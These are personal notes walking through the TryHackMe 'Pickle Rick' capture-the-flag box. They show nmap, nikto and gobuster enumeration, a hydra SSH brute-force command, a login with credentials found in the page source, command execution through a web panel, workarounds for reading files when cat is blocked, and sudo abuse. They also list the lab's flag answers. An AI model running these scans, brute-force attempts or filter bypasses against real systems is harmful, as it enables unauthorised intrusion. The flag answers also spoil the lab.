**IPv4: 10.10.158.113**

We are given https://10-10-158-113.p.thmlabs.com/ to access the web app and start the box.

## Enumeration/Scanning

**Username: R1ckRul3s**

nmap -sV -sC -O -v 10.10.158.113 | tee nmap/initial

Open Ports:

- 22/tcp
    - OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
- 80/tcp
    - Apache httpd 2.4.18 ((Ubuntu))

nikto -h [http://$IP](http://%24ip/) | tee nikto.log

- login.php*

import IP=10.10.158.113
gobuster dir -u [http://$IP](http://%24ip/) -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sh,txt,cgi,html,js,css/py -o gobuster/test

- ![[Pasted image 20230405030558.png]]
![[Pasted image 20230405013800.png]]
- bootstrap.min.css
    - nothing
- bootstrap.min.js
    - nothing
- jquery.min.js
    - nothing

The pictures could possibly contain hidden strings?

robots.txt

- **Contents: "Wubbalubbadubdub"**

gobuster dir -u https://10-10-158-113.p.thmlabs.com/assets -w /usr/share/dirb/wordlists/common.txt -o gobuster/assets

- Nothing

use hydra to brute force into 22 with username found

- hydra -l R1ckRul3s -P /usr/share/wordlists/rockyou.txt ssh://10.10.158.113
- target does not use password authentication.

login.php

- username: R1ckRul3s
- password: Wubbalubbadubdub

portal.php

- html has an encoded message
- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
- Using cyberchef it decoded to "Rabbit hole"

I'm able to send cmd commands in the command panel

unable to cat the txt file,

first ingredient location:

- /var/www/html/Sup3rS3cretPickl3Ingred.txt
- Since I cannot cat, I tried accessing it through the URL
    - [10-10-158-113.p.thmlabs.com/portal.php/../Sup3rS3cretPickl3Ingred.txt](http://10-10-158-113.p.thmlabs.com/Sup3rS3cretPickl3Ingred.txt)
    - Ingredient: mr. meeseek hair

second ingrediant location:

- /home/rick/second ingredient
- tac /home/rick/secondingredients | tac
- 1 jerry tear

## Exploitation

## Privilege Escalation

sudo -l

- All have sudo powers

third ingredient location:

- I checked the root folder. I had to use sudo to do so. Since ALL have sudo powers I can.
- fleeb juice

netcat also disabled

Here are other ways you could view the files

- grep . file.txt
- while read line; do echo $line; done < file.txt
- grep -R .

## Post-exploitation

None
